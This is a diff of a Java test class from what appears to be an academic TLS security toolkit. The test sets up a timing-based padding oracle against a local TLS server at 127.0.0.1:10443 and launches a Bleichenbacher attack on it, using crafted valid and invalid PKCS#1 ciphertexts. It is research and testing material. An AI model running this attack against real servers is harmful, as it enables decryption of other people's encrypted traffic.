@@ -7,8 +7,7 @@ import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.AOracle;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.JSSE16Oracle;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.StdPlainOracle;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.TimingOracle;
-import de.rub.nds.ssl.stack.protocols.commons.EProtocolVersion;
-import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
+import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.lang.reflect.Method;
@@ -49,8 +48,29 @@ public class BleichenbacherJSSETest1024 {
     /**
      * Plain PKCS message
      */
-    byte[] plainPKCS = new byte[]{
-        (byte) 2, (byte) 49, (byte) -97, (byte) 123, (byte) 127, (byte) 103, (byte) -83, (byte) 103, (byte) 9, (byte) 25, (byte) -17, (byte) -17, (byte) -21, (byte) 117, (byte) -69, (byte) 15, (byte) -43, (byte) 43, (byte) -19, (byte) -111, (byte) 35, (byte) 127, (byte) 73, (byte) -3, (byte) -45, (byte) 3, (byte) 15, (byte) -87, (byte) 93, (byte) -107, (byte) 115, (byte) 53, (byte) -5, (byte) -43, (byte) -45, (byte) 87, (byte) 43, (byte) -65, (byte) 87, (byte) 109, (byte) -95, (byte) -123, (byte) 71, (byte) -63, (byte) 11, (byte) -59, (byte) 101, (byte) -7, (byte) -109, (byte) -117, (byte) 33, (byte) 85, (byte) 49, (byte) 33, (byte) -91, (byte) -69, (byte) 97, (byte) 15, (byte) -83, (byte) -105, (byte) 21, (byte) -65, (byte) 45, (byte) 43, (byte) 127, (byte) 5, (byte) -37, (byte) -23, (byte) 15, (byte) 105, (byte) -117, (byte) 41, (byte) 65, (byte) -5, (byte) 7, (byte) 87, (byte) -103, (byte) 13, (byte) 0, (byte) -127, (byte) -31, (byte) 59, (byte) -123, (byte) -29, (byte) 49, (byte) 7, (byte) 25, (byte) 5, (byte) -35, (byte) 75, (byte) -71, (byte) -17, (byte) -69, (byte) -67, (byte) 123, (byte) -33, (byte) -67, (byte) -31, (byte) -27, (byte) -69, (byte) 125, (byte) -13, (byte) -111, (byte) 119, (byte) -85, (byte) 73, (byte) 47, (byte) -101, (byte) 125, (byte) -37, (byte) -53, (byte) -95, (byte) -27, (byte) -79, (byte) 115, (byte) -39, (byte) -105, (byte) 35, (byte) 15, (byte) -21, (byte) 31, (byte) -51, (byte) -113, (byte) 21, (byte) 91, (byte) 125, (byte) -11};
+    byte[] plainPKCS = new byte[]{(byte) 0,
+        (byte) 2, (byte) 49, (byte) -97, (byte) 123, (byte) 127, (byte) 103, 
+        (byte) -83, (byte) 103, (byte) 9, (byte) 25, (byte) -17, (byte) -17, 
+        (byte) -21, (byte) 117, (byte) -69, (byte) 15, (byte) -43, (byte) 43, 
+        (byte) -19, (byte) -111, (byte) 35, (byte) 127, (byte) 73, (byte) -3, 
+        (byte) -45, (byte) 3, (byte) 15, (byte) -87, (byte) 93, (byte) -107, 
+        (byte) 115, (byte) 53, (byte) -5, (byte) -43, (byte) -45, (byte) 87, 
+        (byte) 43, (byte) -65, (byte) 87, (byte) 109, (byte) -95, (byte) -123, 
+        (byte) 71, (byte) -63, (byte) 11, (byte) -59, (byte) 101, (byte) -7, 
+        (byte) -109, (byte) -117, (byte) 33, (byte) 85, (byte) 49, (byte) 33, 
+        (byte) -91, (byte) -69, (byte) 97, (byte) 15, (byte) -83, (byte) -105, 
+        (byte) 21, (byte) -65, (byte) 45, (byte) 43, (byte) 127, (byte) 5, 
+        (byte) -37, (byte) -23, (byte) 15, (byte) 105, (byte) -117, (byte) 41, 
+        (byte) 65, (byte) -5, (byte) 7, (byte) 87, (byte) -103, (byte) 13, 
+        (byte) 0, (byte) -127, (byte) -31, (byte) 59, (byte) -123, (byte) -29, 
+        (byte) 49, (byte) 7, (byte) 25, (byte) 5, (byte) -35, (byte) 75, 
+        (byte) -71, (byte) -17, (byte) -69, (byte) -67, (byte) 123, (byte) -33, 
+        (byte) -67, (byte) -31, (byte) -27, (byte) -69, (byte) 125, (byte) -13, 
+        (byte) -111, (byte) 119, (byte) -85, (byte) 73, (byte) 47, (byte) -101, 
+        (byte) 125, (byte) -37, (byte) -53, (byte) -95, (byte) -27, (byte) -79, 
+        (byte) 115, (byte) -39, (byte) -105, (byte) 35, (byte) 15, (byte) -21, 
+        (byte) 31, (byte) -51, (byte) -113, (byte) 21, (byte) 91, (byte) 125, 
+        (byte) -11};
     private PrivateKey privateKey;
     private PublicKey publicKey;
     /**
@@ -140,14 +160,34 @@ public class BleichenbacherJSSETest1024 {
             NoSuchPaddingException,
             IOException,
             GeneralSecurityException {
-        //JSSE16Oracle jsseOracle = new JSSE16Oracle("127.0.0.1", 10443);
         byte[] pms = new byte[48];
         System.arraycopy(plainPKCS, 80, pms, 0, pms.length);
-        TimingOracle jsseOracle = new TimingOracle("127.0.0.1", 10443,
-                privateKey, AOracle.OracleType.TTT, pms);
-        byte[] enc;
+        pms[0] = 03;
+        pms[1] = 01;
+        TimingOracle timingOracle = new TimingOracle("127.0.0.1", 10443,
+                privateKey, AOracle.OracleType.FFT, pms);
 
-        int counter = 0;
+        byte[] valid;
+        byte[] invalid;
+        byte[] plainPKCSCopy = new byte[plainPKCS.length];
+        System.arraycopy(plainPKCS, 0, plainPKCSCopy, 0, plainPKCSCopy.length);
+        valid = encryptHelper(plainPKCSCopy, publicKey);
+
+        System.arraycopy(plainPKCS, 0, plainPKCSCopy, 0, plainPKCSCopy.length);
+        plainPKCSCopy[plainPKCSCopy.length - 48] = (byte) 23;
+        invalid = encryptHelper(plainPKCSCopy, publicKey);
+
+        timingOracle.warmUp(valid, invalid);
+
+        try {
+            new File("test.csv").delete();
+            new File("invalid.csv").delete();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        BleichenbacherCrypto12 attacker = new BleichenbacherCrypto12(valid, timingOracle, true);
+        attacker.attack();
 
 //        //test invalid PKCS1 messages
 //        test = getInvalidPKCS1messages();
@@ -173,23 +213,26 @@ public class BleichenbacherJSSETest1024 {
 
         // invalid ssl version number (explicitly taken 128, 129 and 255 to 
         // produce a "byte converstion overflow")
-        int[] x = {0, 1, 2, 3, 4, 128, 129, 255};
-        for (int i = 0; i < x.length; i++) {
-            plainPKCS[plainPKCS.length - 48] = (byte) x[i];
-            enc = encryptHelper(plainPKCS, publicKey);
-            jsseOracle.checkPKCSConformity(enc);
-            counter++;
-        }
+        /*System.arraycopy(plainPKCS, 0, plainPKCSCopy, 0, plainPKCSCopy.length);
+         int[] x = {0, 1, 2, 3, 4, 128, 129, 255};
+         for (int i = 0; i < x.length; i++) {
+         plainPKCSCopy[plainPKCSCopy.length - 48] = (byte) x[i];
+         enc = encryptHelper(plainPKCSCopy, publicKey);
+         jsseOracle.checkPKCSConformity(enc);
+         counter++;
+         }
 
-        Thread.sleep(5000);
+         Thread.sleep(5000);
 
-        // valid
-        enc = encryptHelper(plainPKCS, publicKey);
+         // valid
+         System.arraycopy(plainPKCS, 0, plainPKCSCopy, 0, plainPKCSCopy.length);
+         enc = encryptHelper(plainPKCSCopy, publicKey);
 
-        jsseOracle.checkPKCSConformity(enc);
-        counter++;
+         jsseOracle.checkPKCSConformity(enc);
+         counter++;
 
-        System.out.println("counter: " + counter);
+         System.out.println("counter: " + counter);
+         * */
     }
 
 //    /**
